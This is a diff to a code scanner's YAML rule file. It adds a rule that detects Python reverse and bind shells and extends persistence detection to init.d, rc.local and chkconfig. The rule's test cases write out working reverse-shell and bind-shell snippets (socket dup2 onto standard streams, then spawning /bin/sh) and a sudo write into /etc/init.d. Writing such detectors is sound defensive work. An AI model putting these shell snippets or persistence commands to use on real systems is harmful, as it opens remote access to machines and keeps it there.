@@ -411,6 +411,43 @@ rules:
         - 'sock.connect((host, port))'
         - 'requests.get("http://192.0.2.9")'
 
+  - id: CAP.PY.SHELL_STDIO_JOINED.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    title: Joins a shell's input and output to a socket (Python)
+    message: >
+      This file duplicates a socket onto standard input and output and starts a shell, or starts a
+      shell with a socket as its streams. A shell whose input and output are a socket is a remote
+      prompt -- a reverse shell when the socket connects out, a bind shell when it accepts --
+      whether the address is a literal, a variable or a setting.
+    remediation: >
+      No action for this signal alone. It is how a reverse or bind shell is written in Python.
+    provenance:
+      kind: incident
+      reference: >
+        PyPI pipinpeace-reverse and pipinpeace-bind (M3 unseen half A): an install command runs
+        `os.dup2(s.fileno(), fd)` for 0, 1, 2 and `pty.spawn` of a shell, the address a parameter;
+        the scanner reported nothing (label check, reviews/pypi-98/13, 2026-11-08).
+    languages: [python]
+    match:
+      kind: regex
+      patterns:
+        - '\bdup2\s{0,4}\(\s{0,4}[A-Za-z_][\w.]{0,40}\.\s{0,4}fileno\s{0,4}\(\s{0,4}\)\s{0,4},\s{0,4}(?:0|[A-Za-z_]\w{0,20})\s{0,4}\)[\s\S]{0,800}?\b(?:spawn|call|run|Popen|system|exec[lv]p?e?)\s{0,4}\(\s{0,4}\[?\s{0,4}["''](?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh\b'
+        - '\b(?:Popen|call|run)\s{0,4}\(\s{0,4}\[\s{0,4}["''](?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh["''][^\n]{0,200}?\bstd(?:in|out)\s{0,4}=\s{0,4}[A-Za-z_][\w.]{0,40}\.\s{0,4}fileno\s{0,4}\('
+    tests:
+      positive:
+        - "s = socket.socket()\ns.connect((host, port))\nfor fd in (0, 1, 2):\n    os.dup2(s.fileno(), fd)\npty.spawn(\"/bin/sh\")"
+        - "conn, _ = srv.accept()\nos.dup2(conn.fileno(), 0)\nos.dup2(conn.fileno(), 1)\nsubprocess.call([\"/bin/bash\", \"-i\"])"
+        - "p = subprocess.Popen([\"/bin/sh\", \"-i\"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())"
+      negative:
+        - "os.dup2(log.fileno(), 2)\nprint('ready')"
+        - "os.dup2(log.fileno(), 2)\nsubprocess.run([\"/bin/sh\", \"-c\", cmd])"
+        - "subprocess.run([\"/bin/sh\", \"-c\", cmd], stdout=log)"
+        - "sock.sendall(data)\nsubprocess.run([\"ls\"])"
+
   # ---------------------------------------------------------------------
   # PERSIST
   # ---------------------------------------------------------------------
@@ -485,6 +522,7 @@ rules:
         # and writing the line that makes it start at login.
         - '["''`]systemd["''`][ \t]{0,4},[ \t]{0,4}["''`](?:system|user)["''`]'
         - 'systemctl[ \t]{1,4}(?:--user[ \t]{1,4})?enable\b'
+        - '/etc/init\.d/|/etc/rc\.local\b|update-rc\.d[ \t]|chkconfig[ \t]{1,4}(?:--add|\S+[ \t]{1,4}on\b)'
         - 'WantedBy=(?:default|multi-user)\.target'
         # The registry key a login runs, spelled as Python source does: one escaped backslash or a raw
         # string's single one (review 98: a clipboard stealer's `winreg` Run entry was missed).
@@ -499,6 +537,7 @@ rules:
         - "open(home + '/.bashrc', 'a').write(line)"
         - "subprocess.run(['crontab', '-'])"
         - "path = site_packages / 'sitecustomize.py'"
+        - "os.system('sudo sh -c \"echo x > /etc/init.d/svc\"')"
       negative:
         - "profile = load_user_profile(user_id)"
         - "logger.info('service started')"
